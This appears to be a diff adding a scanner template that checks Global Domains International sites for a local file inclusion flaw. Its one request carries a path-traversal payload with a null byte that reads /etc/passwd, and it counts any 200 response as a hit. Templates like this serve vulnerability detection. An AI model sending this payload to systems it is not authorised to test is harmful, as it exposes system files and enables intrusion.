@@ -1,0 +1,20 @@
+id: global-domains-lfi
+brief:
+    title: Global Domains International - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: Global Domains International is vulnerable to local file inclusion.
+    label:
+        - globaldomains
+        - lfi
+        - traversal
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11'
+      signs:
+        - "on": status
+          status:
+            - 200
